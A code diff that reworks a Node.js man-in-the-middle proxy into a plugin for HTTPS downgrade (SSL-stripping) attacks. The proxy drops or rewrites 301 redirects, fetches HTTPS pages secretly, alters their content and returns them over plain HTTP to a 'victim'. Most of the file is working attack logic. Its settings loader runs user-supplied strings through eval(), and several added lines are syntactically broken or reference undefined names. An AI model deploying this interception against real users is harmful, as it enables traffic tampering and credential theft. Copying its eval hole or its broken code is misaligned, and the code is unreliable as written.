@@ -1,46 +1,107 @@
-// trying a downgrade attack similar to https://medium.com/@nusenu/how-malicious-tor-relays-are-exploiting-users-in-2020-part-i-1097575c0cac
+// run with arg `test` to open a local proxy
+// trying a downgrade attack similar to:
+//  https://medium.com/@nusenu/how-malicious-tor-relays-are-exploiting-users-in-2020-part-i-1097575c0cac
 // when user attempts to go to https website we will inject a 301 redirect to HTTP
-// run with arg test to open a local proxy
 /*
 
-
-          We will need to setup a connection to the target as a client and then forward traffic back through http to our victium
-
+  We will need to setup a connection to the target as a client and then forward traffic back through http to our victum
 
 */
+//const iptables = require('./lib/iptables.js');
+//const inherits = require('util').inherits;
+//const { filter } = require('async');
+const Proxy = require('http-mitm-proxy');
+const net = require('net');
+const { Buffer } = require('buffer');
+const https = require('https');
+const plugins = require('plugins');
+
+
+//
+// Monster-In-The-Middle plugin defintion
+//
+// should have a view for start stop and log and config all in one
+export.settings = {};
+var plugin_name = 'intercept';
+exports.plugin = {
+  name: plugin_name,
+  description: '',
+  menuname: 'HTTP/S Intercept',
+  submenus: [
+    {'start':  () => exports.init()  },
+    {'stop':   () => exports.stop() },
+    {'pause':  () => exports.pause() },
+    {'exit':   () => exports.close() },
+    {'log':    () => exports.show_log() },
+    {'settings':    () => exports.show_log() },
+  ],
+  get_settings: () => {
+    // get config from the global settings file or else use defaults
+    var settings = plugins.get_settings(plugin_name);
+    if (settings || Object.keys(settings).length > 0) {
+      exports.filters = settings.filters;
+      return settings;
+    }
+    else {
+      return {'filters': exports.filters };
+    }
+  }
+  set_settings: string => {
+    if (typeof string === 'string') {
+      eval(`_tmp=${string}`);
+      exports.settings = _tmp;
+    }
+    else {
+      exports.settings = string; 
+    }
+    // save the settings to file
+    plugin.set_settings(exports.settings)
+  }
+}
+ 
 
 // using https://github.com/joeferner/node-http-mitm-proxy#readme
 
-var Proxy = require('http-mitm-proxy');
-var iptables = require('./lib/iptables.js');
-var net = require('net');
-const { Buffer } = require('buffer');
-var inherits = require('util').inherits;
-const https = require('https');
-const { filter } = require('async');
 
 var port = 8080;
 var proxy = Proxy();
 
-// match and replace content or drop
-// first filter modifies body
-// second filter will modify 301 to 200
-// third will drop 301 entirely (not allowing header to return)
+
+/*
+ * Filters
+ * 
+ * Types:
+ * - Modify http request body
+ *    This type assumed when.......TODO.........
+ * - Modify http 301 redirect to HTTPS request
+ *    Instead of redirect we will drop the 301 (not allow header to return) 
+ *    and respond to requests and forward them to the 301 destination, and 
+ *    then attempt to modify content in transit between the two.
+ * - Drop http 301 and force requests to HTTP
+ *    This assumes the server will 
+ */
 // Note that target host/ips can only have one filter
-exports.filters = [
-  // this rule will see a http://nathafain.com request, ignore possible 301 redirect, secretly send to https://, modify the response and return that over http
+exports.settings.filters = [
+  // this rule 
+  //  1. trigger on request to http://nathafain.com , 
+  //  2. ignore possible 301 redirect, 
+  //  3. secretly send request to https://nathanfain.com, 
+  //  4. modify the response from https and return that over http
   {     dsthosts: [ 'nathanfain.com' ],
       urlreplace: [ 'https://nathanfain.com' ], // on dsthosts[N], drop and request urlreplace[N]+urlpath instead
    bodytransform: body => body.toString('utf-8').toUpperCase(),
            debug: true,
-           // drop: true, // drop will not send any data in response to client request
+           // drop: true, // drop will then *not* send any data in response to client request
         },
 
-  // this rule would drop all https://nathanfain.com requests
+  // this rule
+  //  1. drop all requests to https://nathanfain.com
+  //  this could be effective when assuming there is a 301 on http but the client would continue to request to http of the 301 fails. this condition is unlikely and I could only imagine it happening on a http->https upgrade attempt on a badly programmed app
   // { dsthosts: [ 'nathanfain.com:443'],
   //       drop: true, },
 
-  // this rune attempts to modify the http initial version. 
+  // this rule
+  //  1. attempt to modify the initial http version
   // its a failed attempt to see how far we can play with https proxying
   // currently this form of replacement does not work for HTTPS:
   // these filters *can* be used to drop https requests
@@ -62,25 +123,25 @@ exports.filters = [
             drop: true },
 ]
 
-// this is updated by functions that edit filters and is just used to more quickly check for hosts
-// retains the filter index
+
+// these values are populated just used to more quickly check for hosts and are opulated by functions
 exports.filters_hosts = []; // array of all host names found
-exports.filters_index = {}; // 'hostname' = index in filters[]
-function update_filters_hosts() {
-  exports.filters_hosts = exports.filters.map(f => f.dsthosts).flat();
-  exports.filters.forEach( (f, index) => {
+exports.filters_index = {}; // reverse map of {'hostname':#} to its index number in filters_hosts[]
+exports.update_filters_hosts = update_filters_hosts() {
+  exports.filters_hosts = exports.settings.filters.map(f => f.dsthosts).flat();
+  exports.settings.filters.forEach( (f, index) => {
     f.dsthosts.forEach(host => {
       exports.filters_index[host] = index;
     });
   });
 }
-update_filters_hosts();
-exports.update_filters_hosts = update_filters_hosts;
-exports.filters_get = () => exports.filters;
-exports.filters_set = _filters => {
-  exports.filters = _filters;
-  update_filters_hosts();
+exports.get_filters = () => exports.settings.filters;
+exports.set_filters = _filters => {
+  exports.settings.filters = _filters;
+  exports.update_filters_hosts();
 }
+// call once on load
+exports.update_filters_hosts();
 
 
 proxy.onError(function(ctx, err) {
@@ -103,7 +164,7 @@ proxy.onRequest(function(ctx, callback) {
   if ( exports.filters_hosts.indexOf(ctx.clientToProxyRequest.headers.host) >= 0)
   {
     var _i = exports.filters_index[ctx.clientToProxyRequest.headers.host]
-    var filter = exports.filters[_i]
+    var filter = exports.settings.filters[_i]
     console.log('filter',filter)
     // URLreplace is used to prevent 301 redirect from http to https
     // we will make the request secretly and return content back over http
@@ -169,7 +230,7 @@ proxy.onConnect(function(req, client_to_proxy_socket, head) {
   {
 
     var _findx = exports.filters_index[req.headers.host]
-    var filter = exports.filters[_findx]
+    var filter = exports.settings.filters[_findx]
     console.log('filter',filter)
    
     if (filter.drop) {
